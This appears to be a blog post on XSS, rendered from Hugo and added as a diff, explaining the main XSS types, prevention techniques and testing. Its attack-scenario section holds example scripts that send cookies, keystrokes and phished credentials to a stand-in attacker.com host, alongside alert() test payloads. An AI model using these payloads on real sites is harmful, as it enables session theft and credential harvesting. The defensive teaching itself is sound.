@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cross-Site Scripting (XSS) Attacks Explained | yad0::security</title>
+<meta name="description" content="Security research, vulnerability analysis, and exploitation techniques">
+
+<link rel="stylesheet" href="/%3cYOUR_REPOSITORY_NAME%3e/css/style.css">
+<link rel="stylesheet" href="/%3cYOUR_REPOSITORY_NAME%3e/css/syntax.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+</head>
+<body>
+    <div class="container">
+        <header>
+    <nav>
+        <a href="https://%3cYOUR_GITHUB_USERNAME%3e.github.io/%3CYOUR_REPOSITORY_NAME%3E/" class="logo">yad0::security</a>
+        <ul class="nav-links">
+            <li><a href="https://%3cYOUR_GITHUB_USERNAME%3e.github.io/%3CYOUR_REPOSITORY_NAME%3E/">Home</a></li>
+            <li><a href="/%3cYOUR_REPOSITORY_NAME%3e/posts">Posts</a></li>
+            <li><a href="/%3cYOUR_REPOSITORY_NAME%3e/about">About</a></li>
+        </ul>
+    </nav>
+</header>
+        <main>
+            
+<article class="post">
+    <header class="post-header">
+        <h1>Cross-Site Scripting (XSS) Attacks Explained</h1>
+        <div class="post-meta">
+            <span>Dec 4, 2025</span>
+            | <span>Authored by yad0</span>
+            
+            | Tags: 
+            
+            <a href="/%3cYOUR_REPOSITORY_NAME%3e/tags/web-security">#web-security</a>
+            
+            <a href="/%3cYOUR_REPOSITORY_NAME%3e/tags/xss">#xss</a>
+            
+            <a href="/%3cYOUR_REPOSITORY_NAME%3e/tags/javascript">#javascript</a>
+            
+            <a href="/%3cYOUR_REPOSITORY_NAME%3e/tags/vulnerabilities">#vulnerabilities</a>
+            
+            
+        </div>
+    </header>
+
+    <div class="post-content">
+        <p>Cross-Site Scripting (XSS) is one of the most prevalent web application vulnerabilities. Let&rsquo;s dive into what XSS is, the different types, and how to defend against them.</p>
+<h2 id="what-is-xss">What is XSS?</h2>
+<p>XSS attacks occur when an attacker injects malicious scripts (usually JavaScript) into web pages viewed by other users. These scripts execute in the victim&rsquo;s browser context, potentially stealing data, hijacking sessions, or defacing websites.</p>
+<h2 id="types-of-xss">Types of XSS</h2>
+<h3 id="1-reflected-xss-non-persistent">1. Reflected XSS (Non-Persistent)</h3>
+<p>The malicious script comes from the current HTTP request. It&rsquo;s &ldquo;reflected&rdquo; back to the user.</p>
+<p><strong>Example:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="c">&lt;!-- Vulnerable search functionality --&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>You searched for: <span class="cp">&lt;?php echo $_GET[&#39;query&#39;]; ?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><strong>Attack URL:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">https://vulnerable-site.com/search?query=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+</span></span></code></pre></div><h3 id="2-stored-xss-persistent">2. Stored XSS (Persistent)</h3>
+<p>The malicious script is permanently stored on the target server (database, forum post, comment field).</p>
+<p><strong>Example:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Vulnerable comment system
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">comment</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span> <span class="c1">// No sanitization
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="nx">database</span><span class="p">.</span><span class="nx">save</span><span class="p">(</span><span class="nx">comment</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="c1">// Later displayed to all users
+</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;comments&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">comment</span><span class="p">;</span>
+</span></span></code></pre></div><h3 id="3-dom-based-xss">3. DOM-Based XSS</h3>
+<p>The vulnerability exists in client-side code rather than server-side.</p>
+<p><strong>Example:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="c1">// Vulnerable code
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">).</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;welcome&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;Hello &#39;</span> <span class="o">+</span> <span class="nx">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><strong>Attack:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">https://site.com/page?name=&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;
+</span></span></code></pre></div><h2 id="real-world-attack-scenarios">Real-World Attack Scenarios</h2>
+<h3 id="session-hijacking">Session Hijacking</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Steal session cookies
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://attacker.com/steal?cookie=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></div><h3 id="keylogging">Keylogging</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Capture keystrokes
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;keypress&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://attacker.com/log?key=&#39;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></div><h3 id="phishing">Phishing</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Inject fake login form
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;&lt;form action=&#34;https://attacker.com/harvest&#34;&gt;&#39;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="s1">&#39;&lt;input name=&#34;username&#34; placeholder=&#34;Username&#34;&gt;&#39;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="s1">&#39;&lt;input type=&#34;password&#34; name=&#34;password&#34; placeholder=&#34;Password&#34;&gt;&#39;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">        <span class="s1">&#39;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></div><h2 id="prevention-techniques">Prevention Techniques</h2>
+<h3 id="1-output-encodingescaping">1. Output Encoding/Escaping</h3>
+<p><strong>HTML Context:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">function</span> <span class="nx">escapeHtml</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="k">return</span> <span class="nx">unsafe</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">        <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;/g</span><span class="p">,</span> <span class="s2">&#34;&amp;amp;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="s2">&#34;&amp;lt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/g</span><span class="p">,</span> <span class="s2">&#34;&amp;gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">        <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#34;/g</span><span class="p">,</span> <span class="s2">&#34;&amp;quot;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">        <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#39;/g</span><span class="p">,</span> <span class="s2">&#34;&amp;#039;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>JavaScript Context:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Use JSON.stringify for safe insertion
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">userInput</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">untrustedData</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="2-content-security-policy-csp">2. Content Security Policy (CSP)</h3>
+<p>Add CSP headers to restrict script sources:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">      <span class="na">content</span><span class="o">=</span><span class="s">&#34;default-src &#39;self&#39;; script-src &#39;self&#39; https://trusted-cdn.com&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><strong>Or via HTTP header:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://trusted-cdn.com
+</span></span></code></pre></div><h3 id="3-input-validation">3. Input Validation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">function</span> <span class="nx">validateInput</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="c1">// Whitelist approach
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">allowedPattern</span> <span class="o">=</span> <span class="sr">/^[a-zA-Z0-9\s,.&#39;-]+$/</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">return</span> <span class="nx">allowedPattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1">// Use it
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">validateInput</span><span class="p">(</span><span class="nx">userInput</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Invalid input detected&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="4-use-safe-apis">4. Use Safe APIs</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// DON&#39;T use innerHTML with user data
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span> <span class="c1">// Dangerous!
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1">// DO use textContent or innerText
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="c1"></span><span class="nx">element</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span> <span class="c1">// Safe
+</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="c1">// Or use createElement
+</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">textNode</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="nx">userInput</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="nx">element</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">textNode</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="5-httponly-cookies">5. HttpOnly Cookies</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Set HttpOnly flag on sensitive cookies
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="nx">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">sessionId</span><span class="o">=</span><span class="nx">abc123</span><span class="p">;</span> <span class="nx">HttpOnly</span><span class="p">;</span> <span class="nx">Secure</span><span class="p">;</span> <span class="nx">SameSite</span><span class="o">=</span><span class="nx">Strict</span>
+</span></span></code></pre></div><h2 id="framework-specific-protection">Framework-Specific Protection</h2>
+<h3 id="react">React</h3>
+<p>React automatically escapes content:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// This is safe - React escapes by default
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;{</span><span class="nx">userInput</span><span class="p">}&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1">// This is dangerous - bypasses escaping
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="c1"></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">dangerouslySetInnerHTML</span><span class="o">=</span><span class="p">{{</span><span class="nx">__html</span><span class="o">:</span> <span class="nx">userInput</span><span class="p">}}</span> <span class="p">/&gt;</span>
+</span></span></code></pre></div><h3 id="angular">Angular</h3>
+<p>Angular sanitizes content automatically:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1">// Safe by default
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;{{</span> <span class="nx">userInput</span> <span class="p">}}&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1">// Use DomSanitizer for trusted content
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="p">{</span> <span class="nx">DomSanitizer</span> <span class="p">}</span> <span class="kr">from</span> <span class="s1">&#39;@angular/platform-browser&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kr">constructor</span><span class="p">(</span><span class="kr">private</span> <span class="nx">sanitizer</span>: <span class="kt">DomSanitizer</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">getTrustedHtml</span><span class="p">(</span><span class="nx">html</span>: <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">sanitizer</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">SecurityContext</span><span class="p">.</span><span class="nx">HTML</span><span class="p">,</span> <span class="nx">html</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="testing-for-xss">Testing for XSS</h2>
+<p><strong>Basic Test Payloads:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(&#39;XSS&#39;)</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(&#39;XSS&#39;)</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;javascript:alert(&#39;XSS&#39;)&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(&#39;XSS&#39;)</span> <span class="na">autofocus</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><strong>Tools:</strong></p>
+<ul>
+<li><strong>XSStrike</strong>: Advanced XSS detection suite</li>
+<li><strong>Burp Suite</strong>: Web vulnerability scanner</li>
+<li><strong>OWASP ZAP</strong>: Free security testing tool</li>
+</ul>
+<h2 id="xss-testing-checklist">XSS Testing Checklist</h2>
+<ul>
+<li><input disabled="" type="checkbox"> Test all input fields (forms, search boxes, URL parameters)</li>
+<li><input disabled="" type="checkbox"> Check file upload functionality</li>
+<li><input disabled="" type="checkbox"> Test HTTP headers (User-Agent, Referer)</li>
+<li><input disabled="" type="checkbox"> Examine cookie values</li>
+<li><input disabled="" type="checkbox"> Review API endpoints</li>
+<li><input disabled="" type="checkbox"> Test DOM manipulation</li>
+<li><input disabled="" type="checkbox"> Verify CSP implementation</li>
+</ul>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li><strong>Never trust user input</strong> - Always sanitize and validate</li>
+<li><strong>Use context-aware encoding</strong> - Different contexts need different encoding</li>
+<li><strong>Implement CSP</strong> - Defense in depth approach</li>
+<li><strong>Use framework protections</strong> - Don&rsquo;t bypass built-in security</li>
+<li><strong>Set HttpOnly flags</strong> - Protect sensitive cookies</li>
+<li><strong>Regular security audits</strong> - Test your applications</li>
+</ol>
+<h2 id="conclusion">Conclusion</h2>
+<p>XSS vulnerabilities can have serious consequences, from stolen credentials to complete account takeover. The good news is that modern frameworks provide built-in protection, and following security best practices can prevent most XSS attacks.</p>
+<p>Remember: defense in depth is key. Combine multiple protection layers for robust security.</p>
+
+    </div>
+</article>
+
+        </main>
+        <footer>
+    <p>&copy; 2025 yad0. All rights reserved.</p>
+    <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> & Custom Cyber Theme</p>
+</footer>
+    </div>
+    <script src="/%3cYOUR_REPOSITORY_NAME%3e/js/main.js"></script>
+</body>
+</html>
